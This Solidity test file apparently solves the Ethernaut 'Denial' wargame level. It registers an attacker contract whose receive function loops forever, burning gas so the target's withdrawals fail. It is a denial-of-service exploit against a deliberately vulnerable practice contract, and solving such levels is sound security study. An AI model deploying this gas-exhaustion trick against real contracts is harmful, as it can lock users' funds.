// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Denial, DenialFactory} from "ethernaut/levels/DenialFactory.sol";

contract DenialLevel is SetUpLevelTest {
    Denial internal denial;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0.001 ether;
        playerBalance = 0 ether;
        level = address(new DenialFactory());
        super.setUp();
        denial = Denial(payable(instance));

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        denial.setWithdrawPartner(address(new DenialAttack()));
        vm.stopPrank();
    }
}

contract DenialAttack {
    receive() external payable {
        while (true) {}
    }
}
